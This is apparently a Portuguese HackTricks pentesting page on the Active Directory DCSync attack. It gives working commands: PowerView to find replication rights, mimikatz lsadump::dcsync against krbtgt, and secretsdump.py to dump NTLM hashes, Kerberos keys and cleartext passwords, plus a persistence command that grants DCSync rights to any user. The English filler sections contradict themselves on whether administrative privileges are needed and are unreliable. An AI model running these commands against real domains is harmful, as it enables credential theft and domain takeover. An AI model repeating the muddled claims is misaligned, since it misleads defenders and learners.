# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## DCSync

A permissão **DCSync** implica ter essas permissões sobre o próprio domínio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.

**Notas importantes sobre o DCSync:**

* O ataque **DCSync simula o comportamento de um Controlador de Domínio e solicita que outros Controladores de Domínio repliquem informações** usando o Protocolo Remoto de Serviço de Replicação de Diretório (MS-DRSR). Como o MS-DRSR é uma função válida e necessária do Active Directory, ele não pode ser desativado ou desabilitado.
* Por padrão, apenas os grupos **Domain Admins, Enterprise Admins, Administrators e Domain Controllers** têm as permissões necessárias.
* Se alguma senha de conta for armazenada com criptografia reversível, há uma opção disponível no Mimikatz para retornar a senha em texto claro.

### Enumeração

Verifique quem possui essas permissões usando `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Explorar Localmente

To exploit a Windows Active Directory environment locally, an attacker can use the DCSync technique. This technique allows the attacker to impersonate a domain controller and request the replication of password hashes from the targeted domain controller.

To perform a DCSync attack, the attacker needs to have administrative privileges on a compromised machine within the domain. The attacker can then use the `mimikatz` tool to execute the DCSync command and retrieve the password hashes.

The DCSync command can be executed using the following syntax:

```
mimikatz # lsadump::dcsync /domain:<domain_name> /user:<username>
```

Replace `<domain_name>` with the name of the target domain and `<username>` with the username of the account whose password hash you want to retrieve.

Once the password hashes are obtained, the attacker can use various techniques to crack them and gain access to user accounts within the domain.

It is important to note that performing a DCSync attack requires administrative privileges on a compromised machine within the domain. Therefore, it is crucial to implement strong security measures to prevent unauthorized access and protect against such attacks.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Explorar Remotamente

DCSync is a technique that allows an attacker to impersonate a domain controller and request the replication of password data from the targeted domain controller. This technique can be used remotely to extract password hashes from the Active Directory database without the need for administrative privileges.

To exploit this vulnerability, the attacker needs to have network access to the targeted domain controller. By sending a specially crafted request, the attacker can trick the domain controller into replicating the password data, which can then be captured and used for further attacks, such as password cracking or lateral movement within the network.

It is important to note that DCSync requires the attacker to have sufficient privileges to impersonate a domain controller. This can be achieved by compromising a privileged account or by exploiting vulnerabilities in the domain controller's security configuration.

To protect against DCSync attacks, it is recommended to implement the following measures:

1. Limit the privileges of user accounts to prevent unauthorized access.
2. Regularly update and patch the domain controller to address any security vulnerabilities.
3. Implement strong password policies and enforce regular password changes.
4. Monitor and log all domain controller activities to detect any suspicious behavior.
5. Use intrusion detection systems (IDS) and intrusion prevention systems (IPS) to detect and block DCSync attacks.
6. Implement multi-factor authentication (MFA) to add an extra layer of security to user accounts.

By following these recommendations, organizations can significantly reduce the risk of DCSync attacks and protect their Active Directory infrastructure from unauthorized access and data leakage.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` gera 3 arquivos:

* um com os **hashes NTLM**
* um com as **chaves Kerberos**
* um com as senhas em texto claro do NTDS para qualquer conta configurada com [**criptografia reversível**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) \*\*\*\* habilitada. Você pode obter usuários com criptografia reversível usando

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistência

Se você é um administrador de domínio, pode conceder essas permissões a qualquer usuário com a ajuda do `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Em seguida, você pode **verificar se o usuário foi atribuído corretamente** as 3 permissões procurando por elas na saída de (você deve ser capaz de ver os nomes das permissões dentro do campo "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigação

* Evento de Segurança ID 4662 (A política de auditoria para o objeto deve estar habilitada) - Uma operação foi realizada em um objeto
* Evento de Segurança ID 5136 (A política de auditoria para o objeto deve estar habilitada) - Um objeto de serviço de diretório foi modificado
* Evento de Segurança ID 4670 (A política de auditoria para o objeto deve estar habilitada) - As permissões em um objeto foram alteradas
* AD ACL Scanner - Crie e compare relatórios de ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referências

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
